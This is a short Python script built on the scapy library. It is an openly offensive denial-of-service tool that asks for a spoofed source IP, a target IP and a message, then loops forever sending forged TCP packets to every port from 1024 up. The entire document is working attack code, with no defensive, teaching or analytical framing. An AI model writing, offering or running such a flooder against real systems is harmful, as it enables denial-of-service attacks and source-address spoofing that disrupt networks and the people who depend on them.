from scapy.all import *

def synflodder(src,tgt,payload):
    for dport in range(1024,65535):
        IPlayer = IP(src=src,dst=tgt)
        TCPlayer = TCP(sport=4444,dport=dport)
        RAWlayer = Raw(load=payload)
        pkt = IPlayer/TCPlayer/RAWlayer
        send(pkt)

source = input('Enter the source IP address to be faked: ')
target = input('Enter the Target IP address to spam: ')
payload = input('Enter the message you want to spam: ')

while True:
    synflodder(source,target,payload)
    
